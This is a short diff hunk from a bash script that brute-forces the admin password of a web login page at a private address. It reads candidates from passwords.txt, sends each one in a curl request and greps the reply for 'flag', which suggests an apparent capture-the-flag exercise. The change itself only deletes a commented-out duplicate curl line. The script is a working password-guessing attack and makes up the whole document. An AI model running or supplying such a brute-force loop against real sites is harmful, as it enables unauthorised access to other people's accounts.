@@ -5,5 +5,4 @@ for i in $(cat passwords.txt) ; do
 #for i in ${password[@]}; do
 	curl -X POST "http://10.11.200.225/index.php?page=signin&username=admin&password=${i}&Login=Login#" | grep 'flag'
 	echo "Tested for: ${i}"
-	#curl -X POST "http://10.11.200.225/index.php?page=signin&username=admin&password=${i}&Login=Login#"
 done
